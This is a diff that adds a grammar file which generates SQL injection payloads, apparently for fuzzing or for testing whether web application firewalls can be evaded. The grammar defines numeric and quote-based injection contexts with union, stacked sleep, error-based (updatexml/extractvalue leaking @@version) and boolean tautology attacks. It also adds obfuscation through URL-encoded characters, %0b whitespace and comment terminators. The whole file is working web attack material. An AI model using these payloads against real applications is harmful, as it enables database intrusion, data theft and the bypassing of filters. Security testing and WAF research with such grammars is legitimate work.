@@ -1,0 +1,85 @@
+start : numericContext | sQuoteContext;
+
+//### Injection Context ###
+numericContext : terDigitIncludingZero wsp booleanAttack wsp | terDigitIncludingZero terSQuote wsp booleanAttack wsp opOr terSQuote terDigitZero | terDigitIncludingZero wsp sqliAttack cmt;
+sQuoteContext : terDigitZero terSQuote fuzzStr wsp booleanAttack wsp opOr terSQuote | terDigitZero terSQuote opOr wsp fuzzEqual wsp booleanAttack wsp opOr terSQuote | terDigitZero terSQuote fuzzStr wsp sqliAttack cmt;
+sqliAttack : unionAttack | piggyAttack | errorAttack | booleanAttack;
+
+//### Union Attacks ###
+unionAttack :opUnion wsp opSel wsp cols | opUnion wsp parOpen opSel wsp cols par;
+cols : terDigitZero;
+
+//### Piggy-backed Attacks ###
+piggyAttack : opSem opSel wsp funcSleep;
+
+//### Error Attacks ###
+errorAttack : opAnd wsp errorFunction parOpen terDigitOne opCom nconcat parOpen n0x7e opCom nversion opCom n0x7e par opCom terDigitOne par;
+errorFunction : 'updatexml' | 'extractvalue';
+nconcat : 'concat';
+n0x7e : '0x7e';
+nversion : '@@version';
+
+//### Boolean values ###
+booleanAttack : orAttack | andAttack;
+orAttack : opOr wsp booleanTrueExpr;
+andAttack : opAnd wsp booleanFalseExpr;
+
+//### True ###
+booleanTrueExpr : unaryTrue | binaryTrue;
+unaryTrue : trueAtom | opNot wsp falseAtom | opBinInvert wsp falseAtom | opBinInvert wsp trueAtom;
+binaryTrue : unaryTrue opEqual wsp parOpen unaryTrue par | unaryFalse opEqual wsp parOpen unaryFalse par | terSQuote terChar terSQuote opEqual terSQuote terChar terSQuote | unaryFalse opLt parOpen unaryTrue par | unaryTrue opGt parOpen unaryFalse par | trueAtom wsp opLike wsp trueAtom | unaryTrue wsp opIs wsp trueConst | unaryFalse wsp opIs wsp falseConst | unaryTrue opMinus parOpen unaryFalse par ;
+trueAtom : trueConst | terDigitOne | na wsp n11 | nx wsp parOpen opSel wsp n111 | nif wsp n11;
+trueConst : 'true';
+na : '{a';
+n11 : '1}=1';
+nx : '{x';
+//nselect : '(select';
+n111 : '1)}=1';
+nif : '{`if`';
+
+//### False ###
+booleanFalseExpr : unaryFalse;
+unaryFalse : opNot wsp trueAtom | opNot opBinInvert falseAtom | falseAtom;
+falseAtom : falseConst |  terDigitZero;
+falseConst : 'false';
+
+//### Obfuscation ###
+wsp : blank;
+
+//### Syntax-repairing ###
+cmt : doubleDash blank | hashtag;
+doubleDash : '--';
+blank : '+' | '%0b';
+hashtag : '%23';
+
+//### SQL functions  and constants ###
+funcSleep : sleep parOpen terDigitExcludingZero par;
+sleep : 'sleep';
+fuzzStr : '<@=1' | '<@!=1' | '<@=1.' | '<@=.1' | '<@!=.1' | '<@!=1.';
+fuzzEqual : '1<@' | '@<@' | '!@<@' | '!@<@.' | '1<@.' | '@<@.';
+parOpen : '(';
+par : ')';
+terDigitIncludingZero : terDigitZero | terDigitExcludingZero;
+terDigitExcludingZero : terDigitOne | '2'| '3' | '4' | '5' | '6' | '7' | '8' | '9';
+terDigitZero : '0';
+terDigitOne : '1';
+terSQuote : '\'' | '%27';
+terChar : 'a';
+
+//### SQL Operators and Keyword ###
+opSem : ';';
+opSel : 'select';
+opAnd : 'and' | '&&';
+opOr : 'or' | '||';
+opIs : 'is';
+opLike : 'like';
+opMinus : '-';
+opCom : ',' | '%2C';
+opGt : '>';
+opLt : '<' | '%3C';
+opEqual : '=';
+opBinInvert : '~' | '%7e';
+opNot : '!' | 'not';
+opUnion : 'union';
+
+
